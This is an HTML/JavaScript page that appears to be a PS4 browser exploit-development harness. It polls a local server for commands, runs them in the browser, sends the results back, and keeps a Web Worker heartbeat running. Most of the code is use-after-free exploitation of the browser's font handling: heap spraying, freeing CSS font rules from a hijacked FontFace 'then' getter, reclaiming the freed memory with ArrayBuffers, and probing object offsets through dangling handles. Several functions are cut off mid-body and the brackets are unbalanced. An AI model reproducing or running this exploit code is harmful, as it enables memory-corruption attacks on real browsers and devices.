<!DOCTYPE html>

var SERVER = 'http://192.168.100.2:8080';
var el = document.getElementById('log');
var statusEl = document.getElementById('status');

function log(m) {
    var d = document.createElement('div');
    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
    el.appendChild(d);
    window.scrollTo(0, document.body.scrollHeight);
}

function sendResult(tag, data) {
    try {
        var x = new XMLHttpRequest();
        x.open('GET', SERVER + '/result?tag=' + encodeURIComponent(tag) + '&r=' + encodeURIComponent(String(data)), false);
        x.send();
        log('SENT [' + tag + ']: ' + String(data).substring(0, 100));
    } catch(e) {
        log('SEND ERROR: ' + e);
    }
}

function sendLog(m) {
    try {
        var x = new XMLHttpRequest();
        x.open('GET', SERVER + '/log?m=' + encodeURIComponent(m), false);
        x.send();
    } catch(e) {}
}

function poll() {
    try {
        var x = new XMLHttpRequest();
        x.open('GET', SERVER + '/poll', false);
        x.send();
        var resp = x.responseText;
        if (resp && resp !== 'null') {
            var cmd = JSON.parse(resp);
            return cmd;
        }
    } catch(e) {
        log('Poll error: ' + e);
    }
    return null;
}

    // Advanced: Heap spray with address detection via TypedArray views
    'heap_spray_detect': function(count, size) {
        count = parseInt(count) || 500;

        // Spray
        for (var i = 0; i < count; i++) {
            var ab = new ArrayBuffer(size);
            var v = new Float64Array(ab);
            v[0] = 0xDEAD + i; // unique marker per buffer
            v[1] = 0xCAFEBABE;
            bufs.push(ab);
            views.push(v);
        }
        // Free every other one to create holes
        var freed = [];
        for (var i = 0; i < count; i += 2) {
            freed.push(bufs[i]);
            bufs[i] = null;
            views[i] = null;
        }
        // Fill holes with new smaller allocations
        var filler = [];
        for (var i = 0; i < count; i += 2) {
            var ab = new ArrayBuffer(size);
            var v = new Uint8Array(ab);
            v[0] = 0x41; // 'A'
            filler.push(ab);
            bufs[i] = ab;
            views[i] = v;
        }
        // Check surviving original buffers for corruption
        var corrupted = 0;
        for (var i = 1; i < count; i += 2) {
            if (views[i] && views[i][0] !== (0xDEAD + i)) {
                corrupted++;
            }
        }
        return JSON.stringify({total: count, freed: freed.length, filler: filler.length, corrupted: corrupted});
    },

    // ============================================================

                        var abs = [];
                        var thenFires = 0;
                        var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                        document.fonts.add(A);
                        void A.loaded;
                        var style = document.createElement('style');
                        document.head.appendChild(style);
                        var idx;
                        for (idx = 0; idx < spray_count / 4; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);

                        try { document.body.offsetTop; } catch(e) {}
                        push('rules: total=' + style.sheet.cssRules.length + ' uaf_idx=' + uaf_idx);

                        var old_then = FontFace.prototype.then;
                        Object.defineProperty(FontFace.prototype, 'then', {
                            configurable: true,
                            get: function() {
                                thenFires++;
                                if (this === A) {
                                    push('THEN GETTER fired on A -- executing free+spray');
                                    try { style.sheet.deleteRule(0); } catch(e) { push('  del0 err ' + e); }
                                    try { document.body.offsetTop; } catch(e) {}
                                    for (idx = spray_count - 1; idx > 0; idx--) {
                                        if (idx !== uaf_idx) { try { style.sheet.deleteRule(idx); } catch(e) {} }
                                    }
                                    try { document.body.offsetTop; } catch(e) {}
                                    var sizes = [];
                                    var s;
                                    for (s = 0xa0; s <= 0xe0; s += 8) sizes.push(s);
                                    push('  ArrayBuffer spray sizes: ' + sizes.join(','));
                                    for (var si = 0; si < sizes.length; si++) {
                                        for (var n = 0; n < 0x40; n++) {
                                            abs.push(new ArrayBuffer(sizes[si]));
                                        }
                                    }
                                    push('  sprayed ' + abs.length + ' ArrayBuffers');
                                }
                                return undefined;
                            }
                        });

                        var fonts;
                        try {
                            fonts = await document.fonts.load('1em a, b', 'AB');
                        } catch(e) {
                            push('PHASE2 load threw: ' + e);
                        }
                        Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then });
                        push('then getter fired ' + thenFires + 'x');
                        push('load result len=' + (fonts ? fonts.length : 'N/A'));
                        if (fonts) {
                            for (idx = 0; idx < fonts.length; idx++) {
                                push('  f[' + idx + '] status=' + fonts[idx].status + ' ur=' + fonts[idx].unicodeRange + ' fs=' + String(fonts[idx].featureSettings));
                            }
                        }

                        // ---- PHASE 3: detection oracles ----
                        var foundUAF = false;
                        if (fonts) {
                            for (idx = 0; idx < fonts.length; idx++) {
                                if (fonts[idx].unicodeRange === 'U+0-10FFFF') {
                                    foundUAF = true;
                                    push('UAF FONT: idx=' + idx + ' status=' + fonts[idx].status + ' fs=' + String(fonts[idx].featureSettings));
                                }
                            }
                            if (!foundUAF) push('no font with default unicodeRange U+0-10FFFF in result');
                        }
                        var reclaimed = [];
                        for (idx = 0; idx < abs.length; idx++) {
                            try {
                                var dv = new DataView(abs[idx]);
                                if (dv.getBigUint64(8, true) === 2n) {
                                    reclaimed.push(idx);
                                    var hdr = [];
                                    for (var b = 0; b < 0x40; b += 8) hdr.push(dv.getBigUint64(b, true).toString(16));
                                    push('RECLAIMED: idx=' + idx + ' size=' + abs[idx].byteLength + ' hdr=' + hdr.join(' '));
                                }
                            } catch(e) {}
                        }
                        push('reclaimed(refcount==2) count=' + reclaimed.length + ' / ' + abs.length);

                        var near = [];
                        for (idx = 0; idx < abs.length && near.length < 8; idx++) {
                            try {
                                var v = new DataView(abs[idx]).getBigUint64(8, true);
                                if (v >= 1n && v <= 3n) near.push(idx + '@' + v.toString());
                            } catch(e) {}

                        push('buffers with refcount 1..3: ' + near.join(' '));
                    } catch(e) {
                        push('FATAL: ' + e + ' | ' + (e && e.stack || ''));
                    } finally {
                        clearTimeout(timer);
                        resolve(out.join('\n'));
                    }
                })();
            });
        })();
    },

                                abs.push(ab);
                            }
                            push('sprayed ' + spray_count + ' bufs size=' + size.toString(16));
                        }
                        return undefined;
                    }
                });

                var fonts = null, outcome = 'HUNG';
                var finished = false;
                function done() {
                    if (finished) return;
                    finished = true;
                    clearTimeout(timer);
                    try { Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then }); } catch(e) {}
                    var detail = [];
                    if (fonts) {
                        for (idx = 0; idx < fonts.length; idx++) {
                            var f = fonts[idx];
                            detail.push('f[' + idx + '] fam=' + f.family + ' st=' + f.status + ' ur=' + f.unicodeRange);
                            if (f.unicodeRange === 'U+0-10FFFF') detail.push('>>> UAF FONT');
                        }
                    }
                    var hits = [];
                    for (var zi = 0; zi < abs.length; zi++) {
                        try {
                            var dv = new DataView(abs[zi]);
                            var v8 = dv.getBigUint64(8, true);
                            if (v8 !== 1n) hits.push('ab[' + zi + '] v8=' + v8.toString(16));
                        } catch(e) {}
                    }
                    push('outcome: ' + outcome + ' len=' + (fonts ? fonts.length : '?'));
                    for (idx = 0; idx < detail.length; idx++) push('  ' + detail[idx]);
                    if (hits.length) { push('  refcount-bumped: ' + hits.length); for (idx = 0; idx < hits.length && idx < 4; idx++) push('  ' + hits[idx]); }
                    finish();
                }
                var timer = setTimeout(function() { outcome = 'HUNG'; done(); }, 8000);

                var p = document.fonts.load('1em a, b', 'AB');
                push('load called');
                p.then(function(fs) { fonts = fs; outcome = 'COMPLETED'; done(); },
                       function(e) { fonts = undefined; outcome = 'REJECTED'; done(); });
            });
        })();
    },

    // STAGE 1G: find m_status offset WITHOUT crashing.
    // Complete load with REAL rr face (valid vptr), then free rr, reclaim its
    // chunk with an all-zero ArrayBuffer (except candidate status byte + refcount),
    // then read fonts[1].status/family/unicodeRange through the dangling handle.
    // family turning empty = overlay confirmed; status==loaded => candidate==m_status.
    'stage1_v16': function(statusHex) {
        return (function() {
            return new Promise(function(resolve) {
                var out = [];
                function push(m) { out.push(m); sendLog('W16: ' + m); }
                var done = false;
                function finish() { if (!done) { done = true; clearTimeout(overall); resolve(out.join('\n')); } }
                var overall = setTimeout(finish, 40000);

                (async function() {
                    try {
                        var statusOff = parseInt(statusHex || '82', 16);
                        var spray_count = 0x80;
                        var spray_font_rule = '@font-face{font-family:spray;src:local(Helvetica Bold);unicode-range:U+0043;}';
                        var uaf_font_rule = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
                        var reclaim_rule = '@font-face{font-family:rr;src:local(Helvetica);unicode-range:U+0043;}';
                        var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                        document.fonts.add(A);
                        void A.loaded;
                        var style = document.createElement('style');
                        document.head.appendChild(style);
                        var idx;
                        for (idx = 0; idx < spray_count / 4; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
                        var uaf_idx = style.sheet.cssRules.length;
                        style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
                        for (idx = spray_count / 4; idx < spray_count; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
                        try { document.body.offsetTop; } catch(e) {}
                        push('setup done, probing st@' + statusOff.toString(16));

                        var old_then = FontFace.prototype.then;
                        Object.defineProperty(FontFace.prototype, 'then', {
                            configurable: true,
                            get: function() {
                                if (this === A) {
                                    try { style.sheet.deleteRule(0); } catch(e) {}
                                    try { document.body.offsetTop; } catch(e) {}
                                    for (idx = spray_count - 1; idx > 0; idx--) {
                                        if (idx !== uaf_idx) { try { style.sheet.deleteRule(idx); } catch(e) {} }
                                    }
                                    try { document.body.offsetTop; } catch(e) {}
                                    push('freed B, inserting ' + spray_count + ' real reclaim rules');
                                    for (var rn = 0; rn < spray_count; rn++) {
                                        try { style.sheet.insertRule(reclaim_rule, style.sheet.cssRules.length); } catch(e) {}
                                    }
                                    try { document.body.offsetTop; } catch(e) {}
                                }
                                return undefined;
                            }
                        });

                        var fonts = await Promise.race([
                            document.fonts.load('1em a, b', 'AB'),
                            new Promise(function(r) { setTimeout(function(){ r('__HUNG__'); }, 10000); })
                        ]);
                        try { Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then }); } catch(e) {}

                        if (fonts === '__HUNG__') { push('HUNG during rr-complete'); finish(); return; }
                        push('rr-complete len=' + fonts.length);

                        var uaf_font = null;
                        for (idx = 0; idx < fonts.length; idx++) if (fonts[idx] !== A) uaf_font = fonts[idx];
                        if (!uaf_font) { push('no non-A font'); finish(); return; }
                        push('before free: fam=' + uaf_font.family + ' st=' + uaf_font.status + ' ur=' + uaf_font.unicodeRange);

                        while (style.sheet.cssRules.length > 0) {
                            try { style.sheet.deleteRule(0); } catch(e) { break; }
                        }
                        try { document.fonts.delete(uaf_font); } catch(e) { push('delete threw: ' + e); }
                        try { document.body.offsetTop; } catch(e) {}
                        push('freed rr rules + delete, document.fonts.size=' + document.fonts.size + ', spraying ABs');

                        var abs = [];
                        for (var n = 0; n < 0x80; n++) {
                            var ab = new ArrayBuffer(0xc0);
                            var dv = new DataView(ab);
                            dv.setBigUint64(8, 1n, true);
                            try { dv.setUint8(statusOff, 3); } catch(e) {}
                            abs.push(ab);
                        }
                        try { document.body.offsetTop; } catch(e) {}

                        var fam2, st2, ur2;
                        try { fam2 = uaf_font.family; } catch(e) { fam2 = 'THROW:' + e; }
                        try { st2 = uaf_font.status; } catch(e) { st2 = 'THROW:' + e; }
                        try { ur2 = uaf_font.unicodeRange; } catch(e) { ur2 = 'THROW:' + e; }
                        push('after AB reclaim: fam=' + fam2 + ' st=' + st2 + ' ur=' + ur2);
                        if (fam2 === '' || fam2 === null || fam2 === 'null') push('>>> OVERLAY CONFIRMED (families zeroed)');
                        if (st2 === 'loaded') push('>>> STATUS FOUND st@' + statusOff.toString(16));
                        push('document.fonts.size=' + document.fonts.size);
                    } catch(e) {
                        push('FATAL: ' + e);
                    } finally {
                        finish();
                    }
                })();
            });
        })();
    }
};

// ============================================
// MAIN LOOP - Poll for commands and execute
// ============================================
log('PS4 Browser Agent started');
log('Polling ' + SERVER + ' for commands...');

function mainLoop() {
    try {
        var cmd = poll();
        if (cmd && cmd.action) {
            log('CMD: ' + cmd.action + (cmd.args ? ' ' + JSON.stringify(cmd.args) : ''));
            
            if (commands[cmd.action]) {
                try {
                    var result = commands[cmd.action].apply(null, cmd.args || []);
                    if (result && typeof result.then === 'function') {
                        result.then(function(val) {
                            sendResult(cmd.action, val);
                            log('RESULT: ' + String(val).substring(0, 200));
                        }).catch(function(e) {
                            sendResult(cmd.action, 'PROMISE REJECT: ' + (e && e.message || e));
                            log('PROMISE REJECT: ' + e);
                        });
                    } else {
                        sendResult(cmd.action, result);
                        log('RESULT: ' + String(result).substring(0, 200));
                    }
                } catch(e) {
                    sendResult(cmd.action, 'THROW: ' + (e && e.message || e));
                    log('COMMAND THROW: ' + e);
                }
            } else {
                sendResult(cmd.action, 'UNKNOWN COMMAND: ' + cmd.action);
            }
        }
    } catch(e) {
        log('LOOP ERROR: ' + e);
    }
    
    // Update status
    statusEl.textContent = 'Active | ' + new Date().toLocaleTimeString();
    
    // Poll every 500ms
    setTimeout(mainLoop, 500);
}

// Start
mainLoop();

// Persistent heartbeat: a Web Worker survives main-thread native blocks but
// dies on renderer crash. Beats carry a unique per-load token.
var TOKEN = Math.random().toString(36).slice(2, 10);
sendLog('PAGE:new:' + TOKEN);
try {
    var hb = new Worker(URL.createObjectURL(new Blob([
        'var t="' + TOKEN + '";' +
        'setInterval(function(){var x=new XMLHttpRequest();' +
        'x.open("GET","' + SERVER + '/log?m=BEAT:"+t,false);x.send();},2000);'
    ], { type: 'application/javascript' })));
} catch(e) { log('hb fail: ' + e); }
</script>
